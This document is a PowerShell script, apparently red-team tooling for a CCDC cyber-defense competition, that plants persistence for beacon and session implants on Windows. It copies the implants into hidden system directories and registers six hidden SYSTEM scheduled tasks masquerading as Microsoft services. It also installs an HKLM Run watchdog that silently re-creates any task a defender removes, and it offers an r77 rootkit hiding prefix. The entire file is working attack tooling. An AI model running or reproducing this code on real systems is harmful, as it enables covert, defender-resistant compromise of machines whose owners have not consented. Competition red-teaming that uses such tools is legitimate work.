# CCDC Windows Phase 3 - Persistence: Task Watchdog Planter
# Plants 6 hidden scheduled tasks (3 beacon / 3 session) plus a self-healing
# HKLM Run watchdog that re-plants missing tasks on every reboot.
# MITRE ATT&CK: T1053.005 T1547.001
#
# 8 persistence mechanisms:
#   Tasks   (6): PerfTrack, Defrag, NetTrace (beacon/AtStartup) +
#                USOPrivate, DiskCleanup, Registry (session/30min)
#   Watchdog(1): HKLM Run -> PS1 that re-plants any cleared tasks
#   (Shell+Userinit repair also runs to fix previously broken machines)
#
# Run as: Administrator
#Requires -RunAsAdministrator
#Requires -Version 5.1

$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 -- Task Watchdog Planter (6 tasks + watchdog)"
Write-Warn "================================================================"
Write-Host ""

# --- Prompt for implant paths ---
Write-Info "Beacons are typically downloaded to the current directory by AUTODEPLOY."
Write-Info "e.g.  C:\Users\Administrator\beac07   and   C:\Users\Administrator\ses08"
Write-Host ""
$BeaconPath  = Read-Host "Enter full path to beacon implant (e.g. C:\Users\Administrator\beac07)"
$SessionPath = Read-Host "Enter full path to session implant (e.g. C:\Users\Administrator\ses08)"

# --- r77 prefix prompt ---
$r77Answer = Read-Host "Prepend `$77 prefix to dropped files/reg values for r77 hiding? (y/N)"
$pfx = ''
if ($r77Answer -match '^[Yy]') { $pfx = '$77' }
if ($pfx) {
    Write-Warn "r77 mode ENABLED -- artifacts prefixed: $pfx"
} else {
    Write-Info "r77 mode: disabled"
}

# --- Input validation ---
Write-Section "Input Validation"
foreach ($p in @($BeaconPath, $SessionPath)) {
    if (-not (Test-Path $p -PathType Leaf)) {
        Write-Err "File not found: $p"
        exit 1
    }
}
$BeaconPath  = (Resolve-Path $BeaconPath).Path
$SessionPath = (Resolve-Path $SessionPath).Path
Write-Info "Beacon  : $BeaconPath"
Write-Info "Session : $SessionPath"

# --- Shell repair: reset Winlogon\Shell to explorer.exe if it was corrupted ---
Write-Section "Shell Repair"
try {
    $wlKey    = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $curShell = (Get-ItemProperty $wlKey -Name "Shell" -ErrorAction Stop).Shell
    if ($curShell -ne "explorer.exe") {
        Set-ItemProperty $wlKey -Name "Shell" -Value "explorer.exe" -Force
        Write-Warn "Shell was [$curShell] -- reset to explorer.exe"
    } else {
        Write-Info "Shell already clean: explorer.exe"
    }
} catch { Write-Warn "Shell repair check failed: $_" }

# --- Userinit repair: strip any appended entries, keep only userinit.exe ---
try {
    $wlKey  = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $curUI  = (Get-ItemProperty $wlKey -Name "Userinit" -ErrorAction Stop).Userinit
    $clean  = "$env:SystemRoot\system32\userinit.exe,"
    if ($curUI -ne $clean) {
        Set-ItemProperty $wlKey -Name "Userinit" -Value $clean -Force
        Write-Warn "Userinit was [$curUI] -- reset to $clean"
    } else {
        Write-Info "Userinit already clean"
    }
} catch { Write-Warn "Userinit repair check failed: $_" }

# --- Drop directories ---
$DropDirs = @(
    "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache",
    "$env:SystemRoot\System32\spool\drivers\color"
)
foreach ($d in $DropDirs) {
    if (-not (Test-Path $d)) {
        try { New-Item -ItemType Directory -Path $d -Force | Out-Null } catch {}
    }
    try {
        $obj = Get-Item $d -Force -ErrorAction Stop
        $obj.Attributes = $obj.Attributes -bor [System.IO.FileAttributes]::Hidden
    } catch {}
}

$psExe = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

$script:DropIdx = 0
function Get-DropDir {
    $d = $DropDirs[$script:DropIdx % $DropDirs.Count]
    $script:DropIdx++
    return $d
}

function Copy-Hidden {
    param([string]$Source, [string]$Dest)
    try {
        $dir = Split-Path $Dest -Parent
        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        Copy-Item -Path $Source -Destination $Dest -Force -ErrorAction Stop
        $item = Get-Item $Dest -Force
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
        return $Dest
    } catch {
        Write-Warn "Copy failed to $Dest : $_"
        return $null
    }
}

$script:Ok   = 0
$script:Fail = 0

# =============================================================================
# SCHEDULED TASKS (6 mechanisms)
# =============================================================================
Write-Section "Scheduled Tasks (1-6)"

$script:TaskSvc = $null
try { $script:TaskSvc = New-Object -ComObject Schedule.Service; $script:TaskSvc.Connect() } catch { Write-Warn "Task Scheduler COM unavailable" }

function New-PersistTask {
    param(
        [string]$TaskName,
        [string]$TaskFolder,
        [string]$PayloadPath,
        [string]$Description,
        [string]$TriggerType  = "AtStartup",
        [int]$IntervalMinutes = 30
    )
    try {
        if ($script:TaskSvc) {
            $parts = $TaskFolder.Trim('\').Split('\')
            $cur   = $script:TaskSvc.GetFolder("\")
            foreach ($part in $parts) {
                try { $cur = $cur.GetFolder($part) } catch { $cur = $cur.CreateFolder($part) }
            }
        }

        $action   = New-ScheduledTaskAction -Execute "`"$PayloadPath`""
        if ($TriggerType -eq "Interval") {
            $trigger = New-ScheduledTaskTrigger `
                -RepetitionInterval (New-TimeSpan -Minutes $IntervalMinutes) `
                -RepetitionDuration (New-TimeSpan -Days 3650) `
                -Once -At (Get-Date).AddSeconds(60)
        } else {
            $trigger = New-ScheduledTaskTrigger -AtStartup
        }
        $settings  = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $taskPath  = "\$TaskFolder\"

        Unregister-ScheduledTask -TaskName $TaskName -TaskPath $taskPath -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask `
            -TaskName    $TaskName `
            -TaskPath    $taskPath `
            -Action      $action `
            -Trigger     $trigger `
            -Settings    $settings `
            -Principal   $principal `
            -Description $Description `
            -Force -ErrorAction Stop | Out-Null
        Write-Success "  Task $taskPath$TaskName -> $PayloadPath"
        return $true
    } catch {
        Write-Err "  Task $TaskName failed: $_"
        return $false
    }
}

# Copy payloads into hidden drop dirs
$tb1 = Copy-Hidden $BeaconPath  (Join-Path (Get-DropDir) "${pfx}perftrack-collector.exe")
$tb2 = Copy-Hidden $BeaconPath  (Join-Path (Get-DropDir) "${pfx}stor-optimizer.exe")
$tb3 = Copy-Hidden $BeaconPath  (Join-Path (Get-DropDir) "${pfx}netdiag-logger.exe")
$ts1 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}wusvc-handler.exe")
$ts2 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}silentcleanup-svc.exe")
$ts3 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}regbackup-svc.exe")

# [1] beacon - AtStartup
Write-Info "[1/6] PerfTrack-StandardCollector -- beacon (AtStartup)"
if ($tb1 -and (New-PersistTask "PerfTrack-StandardCollector" "Microsoft\Windows\PerfTrack" $tb1 "Microsoft Diagnostics Hub standard data collector service")) { $script:Ok++ } else { $script:Fail++ }

# [2] beacon - AtStartup
Write-Info "[2/6] StorOptimizer -- beacon (AtStartup)"
if ($tb2 -and (New-PersistTask "StorOptimizer" "Microsoft\Windows\Defrag" $tb2 "Windows storage optimization service host")) { $script:Ok++ } else { $script:Fail++ }

# [3] beacon - AtStartup
Write-Info "[3/6] NetworkDiagLogger -- beacon (AtStartup)"
if ($tb3 -and (New-PersistTask "NetworkDiagLogger" "Microsoft\Windows\NetTrace" $tb3 "Windows network diagnostic event logger")) { $script:Ok++ } else { $script:Fail++ }

# [4] session - 30 min interval
Write-Info "[4/6] UsoCore-ServiceHandler -- session (30min)"
if ($ts1 -and (New-PersistTask "UsoCore-ServiceHandler" "Microsoft\Windows\USOPrivate" $ts1 "Windows Update notification icon handler" "Interval" 30)) { $script:Ok++ } else { $script:Fail++ }

# [5] session - 30 min interval
Write-Info "[5/6] SilentCleanup2 -- session (30min)"
if ($ts2 -and (New-PersistTask "SilentCleanup2" "Microsoft\Windows\DiskCleanup" $ts2 "Windows disk storage cleanup optimization service" "Interval" 30)) { $script:Ok++ } else { $script:Fail++ }

# [6] session - 30 min interval
Write-Info "[6/6] RegIdleBackup2 -- session (30min)"
if ($ts3 -and (New-PersistTask "RegIdleBackup2" "Microsoft\Windows\Registry" $ts3 "Windows registry idle backup service host" "Interval" 30)) { $script:Ok++ } else { $script:Fail++ }

# =============================================================================
# WATCHDOG + HKLM RUN LAUNCHER
# =============================================================================
Write-Section "Watchdog + Boot Launcher"

$watchdogPath = Join-Path $DropDirs[0] "${pfx}task-watchdog.ps1"

# Build per-task lines to embed in the watchdog (paths baked in at plant time)
$taskLines = @(
    "    @{ Name='PerfTrack-StandardCollector'; Folder='Microsoft\Windows\PerfTrack';  Payload='$tb1'; Trigger='AtStartup'; Interval=0  }",
    "    @{ Name='StorOptimizer';               Folder='Microsoft\Windows\Defrag';      Payload='$tb2'; Trigger='AtStartup'; Interval=0  }",
    "    @{ Name='NetworkDiagLogger';           Folder='Microsoft\Windows\NetTrace';    Payload='$tb3'; Trigger='AtStartup'; Interval=0  }",
    "    @{ Name='UsoCore-ServiceHandler';      Folder='Microsoft\Windows\USOPrivate';  Payload='$ts1'; Trigger='Interval';  Interval=30 }",
    "    @{ Name='SilentCleanup2';             Folder='Microsoft\Windows\DiskCleanup'; Payload='$ts2'; Trigger='Interval';  Interval=30 }",
    "    @{ Name='RegIdleBackup2';             Folder='Microsoft\Windows\Registry';    Payload='$ts3'; Trigger='Interval';  Interval=30 }"
)
$taskBlock = $taskLines -join "`r`n"

$watchdogScript = '$ErrorActionPreference = ''SilentlyContinue''' + "`r`n"
$watchdogScript += '$tasks = @(' + "`r`n"
$watchdogScript += $taskBlock + "`r`n"
$watchdogScript += ')' + "`r`n"
$watchdogScript += @'
$svc = New-Object -ComObject Schedule.Service
$svc.Connect()
foreach ($t in $tasks) {
    if (-not (Get-ScheduledTask -TaskName $t.Name -ErrorAction SilentlyContinue)) {
        $action   = New-ScheduledTaskAction -Execute "`"$($t.Payload)`""
        if ($t.Trigger -eq 'Interval') {
            $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes $t.Interval) `
                -RepetitionDuration (New-TimeSpan -Days 3650) -Once -At (Get-Date).AddSeconds(60)
        } else {
            $trigger = New-ScheduledTaskTrigger -AtStartup
        }
        $settings  = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        $taskPath  = "\$($t.Folder)\"
        try {
            $parts = $t.Folder.Trim('\').Split('\')
            $cur   = $svc.GetFolder("\")
            foreach ($part in $parts) { try { $cur = $cur.GetFolder($part) } catch { $cur = $cur.CreateFolder($part) } }
        } catch {}
        Register-ScheduledTask -TaskName $t.Name -TaskPath $taskPath -Action $action -Trigger $trigger `
            -Settings $settings -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
    }
}
'@

try {
    [System.IO.File]::WriteAllText($watchdogPath, $watchdogScript, [System.Text.Encoding]::ASCII)
    $item = Get-Item $watchdogPath -Force
    $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
    Write-Success "  Watchdog script written: $watchdogPath"
    $script:Ok++
} catch {
    Write-Err "  Watchdog script write failed: $_"
    $script:Fail++
}

# Single HKLM Run key that fires the watchdog on every boot
$runCmd = "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchdogPath`""
try {
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
        -Name "${pfx}WinTaskWatchdog" -Value $runCmd -Type String -Force
    Write-Success "  HKLM Run\${pfx}WinTaskWatchdog -> $watchdogPath"
    $script:Ok++
} catch {
    Write-Err "  HKLM Run watchdog key failed: $_"
    $script:Fail++
}

# =============================================================================
# SUMMARY
# =============================================================================
Write-Host ""
Write-Warn "================================================================"
Write-Warn " Task Watchdog Planter -- Complete"
Write-Warn "================================================================"
Write-Host ""
Write-Host "  --- SCHEDULED TASKS (6) ---" -ForegroundColor Magenta
Write-Host "  [1] \Microsoft\Windows\PerfTrack\PerfTrack-StandardCollector  beacon  AtStartup" -ForegroundColor Cyan
Write-Host "  [2] \Microsoft\Windows\Defrag\StorOptimizer                   beacon  AtStartup" -ForegroundColor Cyan
Write-Host "  [3] \Microsoft\Windows\NetTrace\NetworkDiagLogger             beacon  AtStartup" -ForegroundColor Cyan
Write-Host "  [4] \Microsoft\Windows\USOPrivate\UsoCore-ServiceHandler      session 30min"     -ForegroundColor Cyan
Write-Host "  [5] \Microsoft\Windows\DiskCleanup\SilentCleanup2            session 30min"     -ForegroundColor Cyan
Write-Host "  [6] \Microsoft\Windows\Registry\RegIdleBackup2               session 30min"     -ForegroundColor Cyan
Write-Host "  --- WATCHDOG (1) ---" -ForegroundColor Magenta
Write-Host "  [7] HKLM Run ${pfx}WinTaskWatchdog -> re-plants cleared tasks on boot" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Drop directories:" -ForegroundColor Yellow
foreach ($d in $DropDirs) { Write-Host "    $d" -ForegroundColor Yellow }
Write-Host ""
Write-Success "Result: $($script:Ok) OK  /  $($script:Fail) FAIL  /  8 total"
if ($pfx) {
    Write-Warn "r77 prefix ENABLED -- artifacts prefixed: $pfx"
} else {
    Write-Info "r77 prefix: disabled"
}
Write-Host ""
